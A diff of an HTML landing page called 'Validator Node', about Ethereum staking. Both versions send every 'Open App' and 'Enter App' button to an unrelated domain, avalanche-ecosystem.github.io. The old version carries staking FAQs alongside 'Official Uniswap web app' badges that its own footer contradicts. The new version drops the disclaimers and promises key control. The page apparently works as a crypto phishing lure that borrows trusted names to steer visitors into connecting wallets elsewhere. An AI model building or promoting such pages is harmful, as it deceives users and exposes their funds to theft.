@@ -1,47 +1,88 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Validator Node - Open App</title><meta name="description" content="validator node guide for staking intent, liquid staking routes, and safe Uniswap app checks before you swap.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://validator-node.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Validator Node - Open App"><meta property="og:description" content="validator node guide for staking intent, liquid staking routes, and safe Uniswap app checks before you swap.">
-<meta property="og:url" content="https://validator-node.github.io/"><meta property="og:image" content="https://validator-node.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Validator Node - Open App"><meta name="twitter:description" content="validator node guide for staking intent, liquid staking routes, and safe Uniswap app checks before you swap."><meta name="twitter:image" content="https://validator-node.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://validator-node.github.io/#website", "url": "https://validator-node.github.io/", "name": "Validator Node"}, {"@type": "WebPage", "@id": "https://validator-node.github.io/#webpage", "url": "https://validator-node.github.io/", "name": "Validator Node - Open App", "description": "validator node guide for staking intent, liquid staking routes, and safe Uniswap app checks before you swap.", "inLanguage": "en", "isPartOf": {"@id": "https://validator-node.github.io/#website"}}, {"@type": "Organization", "@id": "https://validator-node.github.io/#org", "name": "Validator Node", "url": "https://validator-node.github.io/", "logo": "https://validator-node.github.io/og-cover.png", "sameAs": ["https://ethereum.org/", "https://x.com/ethereum", "https://github.com/ethereum", "https://www.coingecko.com/en/coins/ethereum"]}, {"@type": "WebApplication", "@id": "https://validator-node.github.io/#app", "name": "Validator Node", "url": "https://validator-node.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "validator node guide for staking intent, liquid staking routes, and safe Uniswap app checks before you swap.", "featureList": ["Official Uniswap web app", "Ethereum staking docs", "Self-custody wallet flow"], "isPartOf": {"@id": "https://validator-node.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://validator-node.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "How much ETH do I need to run a validator node?", "acceptedAnswer": {"@type": "Answer", "text": "A solo Ethereum validator requires a 32 ETH deposit. That amount activates one validator key. Users with less than 32 ETH can consider pooled staking or liquid staking, but those options have different custody and smart-contract risks. Users with more than 32 ETH can run multiple validators, usually one validator key per 32 ETH deposit."}}, {"@type": "Question", "name": "Can I run an Ethereum validator from home?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. Ethereum specifically supports home staking, and ethereum.org frames it as a way to improve decentralization while keeping control of validator keys. A home operator needs reliable internet, suitable hardware, secure key management, and willingness to maintain client software. It is not a set-and-forget product; updates, monitoring, and recovery planning are part of the job."}}, {"@type": "Question", "name": "What happens if my validator node goes offline?", "acceptedAnswer": {"@type": "Answer", "text": "If a validator is offline, it misses duties and loses rewards it could have earned. It can also receive small inactivity penalties while it remains active. Brief downtime is usually not catastrophic, but extended downtime reduces returns. Slashing is different and more severe; it is tied to protocol violations such as double signing, not ordinary short outages."}}, {"@type": "Question", "name": "What is slashing for a validator node?", "acceptedAnswer": {"@type": "Answer", "text": "Slashing is a penalty for behavior that can harm consensus, such as signing conflicting messages. It can remove part of the validator's stake and force the validator to exit. Operators reduce slashing risk by avoiding duplicate validator instances, using safe key management, understanding failover procedures, and not restoring validator keys onto multiple machines that may sign at the same time."}}, {"@type": "Question", "name": "Do validator nodes need both execution and consensus clients?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. Modern Ethereum validation uses both execution-layer and consensus-layer clients. These clients work together to follow the chain, validate data, and perform validator duties. Operators also run validator software that holds or accesses signing keys. Client selection matters because diversity improves network resilience and can reduce correlated risk from a single client bug."}}, {"@type": "Question", "name": "How do I check validator node performance?", "acceptedAnswer": {"@type": "Answer", "text": "Use local monitoring plus a beacon-chain explorer. Useful signals include attestation effectiveness, missed attestations, proposal history, sync status, peer count, disk usage, client version, and withdrawal status. Public tools such as beaconcha.in and Rated can help inspect validator performance, but operators should still monitor their own machine and alerts directly."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Validator Node"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Validator Node</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Validator Node</h1>
-      <div class="bridge-widget" role="group" aria-label="Validator Node preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Ethereum</span></span></div><div class="bw-apy"><b>~3-4%</b><span>APY*</span></div><div class="bw-field"><span class="bw-coin mono">LST</span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>LST</b> · Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Validator Node ↗</a></div>
-      <p class="hero-note">Live preview — APY is indicative; check the live rate in the official Validator Node app.</p>
-      <div class="trust-row"><span class="trust-chip">Official Uniswap web app</span><span class="trust-chip">Ethereum staking docs</span><span class="trust-chip">Self-custody wallet flow</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Validator Node?</h2><div class="capsule"><strong>Validator Node</strong> is an app-first route for users comparing validator-operation intent with <a class="inline-link" href="https://academy.binance.com/en/glossary/liquid-staking" rel="noopener noreferrer">liquid-staking token</a> access. <a href='https://ethereum.org/staking/'>Ethereum staking docs</a> explain the 32 ETH solo-validator path and the tradeoffs around <a class="inline-link" href="https://www.investopedia.com/what-is-ethereum-staking-8588971" rel="noopener noreferrer">pooled staking</a>.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Validator Node at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Ethereum validator infrastructure</b></div><div class="f"><small>Network</small><b>Ethereum</b></div><div class="f"><small>Token</small><b>ETH</b></div><div class="f"><small>Minimum deposit</small><b>32 ETH for <a class="inline-link" href="https://ethereum.org/staking/solo/" rel="noopener noreferrer">solo validation</a></b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://www.investopedia.com/terms/s/self-custody-wallet.asp" rel="noopener noreferrer">Self-custody</a> when solo staking</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Validator Node requirements for Ethereum staking</h2><div class="intent-a">An Ethereum validator node requires a validator key, an <a class="inline-link" href="https://ethereum.org/developers/docs/nodes-and-clients/" rel="noopener noreferrer">execution client</a>, a <a class="inline-link" href="https://github.com/ethereum/consensus-specs" rel="noopener noreferrer">consensus client</a>, reliable internet, storage headroom, and 32 ETH for a solo validator deposit. Ethereum.org describes home staking as running a node connected to the internet and depositing 32 ETH to activate a validator. Operators should also plan for client updates, monitoring, secure key storage, backups, and power or network interruptions. Hardware requirements change over time as chain data grows, so use current client documentation before buying equipment. The key operational goal is high uptime without unsafe duplicate validator signing.</div></div></section><section class="section"><div class="container"><h2>Validator Node rewards, APR, and penalties</h2><div class="intent-a">Ethereum validator rewards come from consensus rewards, priority fees, and block proposal opportunities. The APR is variable, not fixed, because it depends on total ETH staked, network activity, validator performance, and execution-layer rewards. A realistic ETH staking ballpark is around 3-4% before any service fees, but actual results vary. Downtime causes missed rewards and small penalties, while <a class="inline-link" href="https://academy.binance.com/en/glossary/slashing" rel="noopener noreferrer">slashing</a> is reserved for serious consensus violations such as double signing. Operators should monitor attestation performance, missed proposals, sync status, and client health instead of looking only at the headline APR.</div></div></section><section class="section section-alt"><div class="container"><h2>Validator Node setup: execution client and consensus client</h2><div class="intent-a">A validator setup is not one single app. It normally includes an execution client, a consensus client, and validator client duties, plus key management and monitoring. The execution client follows Ethereum transactions and state, while the consensus client follows <a class="inline-link" href="https://www.messari.io/research/ethereum-staking" rel="noopener noreferrer">proof-of-stake consensus</a> and beacon-chain duties. <a class="inline-link" href="https://www.messari.io/research/client-diversity-on-ethereum" rel="noopener noreferrer">Client diversity</a> matters because a dominant-client bug can create correlated validator risk. A serious setup plan includes choosing minority clients where practical, testing on a testnet, securing <a class="inline-link" href="https://github.com/ethereum/staking-deposit-cli" rel="noopener noreferrer">withdrawal credentials</a>, and documenting update and recovery procedures before depositing real ETH.</div></div></section><section class="section"><div class="container"><h2>Validator Node withdrawal and exit process</h2><div class="intent-a">Ethereum validators can set withdrawal credentials and later exit the active validator set, after which the remaining balance is withdrawn according to protocol queues and timing. Exiting is not the same as unplugging the node; an offline validator can keep receiving penalties while active. Operators should understand voluntary exit, partial withdrawals, full withdrawals, validator index tracking, and withdrawal address security. Before exiting, confirm the validator status on a beacon-chain explorer and make sure the withdrawal address is one you control.</div></div></section>
-  <section class="section"><div class="container"><h2>How to swap Validator Node</h2><ol class="steps"><li><b>Check staking intent</b><span>Decide whether you want to run infrastructure, use pooled staking, or simply swap for a <a class="inline-link" href="https://www.kraken.com/learn/what-is-liquid-staking" rel="noopener noreferrer">liquid staking token</a>.</span></li><li><b>Review the source</b><span>Read Ethereum&#x27;s staking docs and the Launchpad before moving ETH or generating <a class="inline-link" href="https://docs.prylabs.network/docs/install/install-with-script" rel="noopener noreferrer">validator keys</a>.</span></li><li><b>Open the app</b><span>Use the official <a class="inline-link" href="https://docs.uniswap.org/contracts/v2/overview" rel="noopener noreferrer">Uniswap domain</a> for swap execution; confirm network, token contract, and wallet prompts.</span></li><li><b>Sign deliberately</b><span>Approve only the token and amount you expect, then keep transaction records for tax and risk review.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official Validator Node app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Validator Node ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Validator Node vs liquid staking</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Validator Node</th><th>Liquid Staking</th></tr></thead><tbody><tr><td>Minimum capital</td><td>32 ETH for solo validation</td><td>Often supports smaller deposits</td></tr><tr><td>Custody</td><td>Self-custody when operated directly</td><td>Protocol smart contracts and operators</td></tr><tr><td>Liquidity</td><td>ETH is tied to validator lifecycle</td><td>Receipt token may be tradable</td></tr><tr><td>Main responsibility</td><td>Uptime, clients, keys, monitoring</td><td>Protocol and receipt-token risk review</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Validator Node FAQ</h2><div class="faq-list"><details open><summary><h3>How much ETH do I need to run a validator node?</h3></summary><div>A solo Ethereum validator requires a 32 ETH deposit. That amount activates one validator key. Users with less than 32 ETH can consider pooled staking or liquid staking, but those options have different custody and smart-contract risks. Users with more than 32 ETH can run multiple validators, usually one validator key per 32 ETH deposit.</div></details><details><summary><h3>Can I run an Ethereum validator from home?</h3></summary><div>Yes. Ethereum specifically supports home staking, and ethereum.org frames it as a way to improve decentralization while keeping control of validator keys. A home operator needs reliable internet, suitable hardware, secure key management, and willingness to maintain client software. It is not a set-and-forget product; updates, monitoring, and recovery planning are part of the job.</div></details><details><summary><h3>What happens if my validator node goes offline?</h3></summary><div>If a validator is offline, it misses duties and loses rewards it could have earned. It can also receive small inactivity penalties while it remains active. Brief downtime is usually not catastrophic, but extended downtime reduces returns. Slashing is different and more severe; it is tied to protocol violations such as double signing, not ordinary short outages.</div></details><details><summary><h3>What is slashing for a validator node?</h3></summary><div>Slashing is a penalty for behavior that can harm consensus, such as signing conflicting messages. It can remove part of the validator's stake and force the validator to exit. Operators reduce slashing risk by avoiding duplicate validator instances, using safe key management, understanding failover procedures, and not restoring validator keys onto multiple machines that may sign at the same time.</div></details><details><summary><h3>Do validator nodes need both execution and consensus clients?</h3></summary><div>Yes. Modern Ethereum validation uses both execution-layer and consensus-layer clients. These clients work together to follow the chain, validate data, and perform validator duties. Operators also run validator software that holds or accesses signing keys. Client selection matters because diversity improves network resilience and can reduce correlated risk from a single client bug.</div></details><details><summary><h3>How do I check validator node performance?</h3></summary><div>Use local monitoring plus a beacon-chain explorer. Useful signals include attestation effectiveness, missed attestations, proposal history, sync status, peer count, disk usage, client version, and withdrawal status. Public tools such as beaconcha.in and Rated can help inspect validator performance, but operators should still monitor their own machine and alerts directly.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">This page is not the official app; verify app.uniswap.org before connecting a wallet; educational only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Validator Node</title>
+  <meta name="description" content="Validator Node lets you run your own Ethereum validator so you keep full control of your keys and rewards.">
+  <link rel="canonical" href="https://validator-node.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F3EC">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Validator Node">
+  <meta property="og:description" content="Validator Node lets you run your own Ethereum validator so you keep full control of your keys and rewards.">
+  <meta property="og:url" content="https://validator-node.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Validator Node">
+  <meta name="twitter:description" content="Validator Node lets you run your own Ethereum validator so you keep full control of your keys and rewards.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://validator-node.github.io/#website",
+        "url": "https://validator-node.github.io/",
+        "name": "Validator Node",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://validator-node.github.io/#app",
+        "name": "Validator Node",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://validator-node.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://validator-node.github.io/#organization",
+        "name": "Validator Node",
+        "url": "https://validator-node.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Validator Node home">
+      <img src="favicon.png" width="28" height="28" alt="">
+      <span>Validator Node</span>
+    </a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://ethereum.org/staking/solo/" target="_blank" rel="nofollow noopener noreferrer">Ethereum guide</a>
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://www.coingecko.com/en/coins/ethereum" target="_blank" rel="nofollow noopener noreferrer">ETH market</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Validator Node</h1>
+      <p class="sub"><strong>Validator Node</strong> lets you run your own Ethereum validator so you keep full control of your keys and rewards.</p>
+    </section>
+
+    <section class="app-card" aria-label="Validator node app">
+      <div class="validator">
+        <span class="coin">
+          <img src="eth.png" width="38" height="38" alt="ETH">
+        </span>
+        <div>
+          <p class="validator-label">Run your own validator</p>
+          <p class="validator-note">Setup steps in app</p>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="foot">Validator Node &mdash; 2026</footer>
+</body>
+</html>
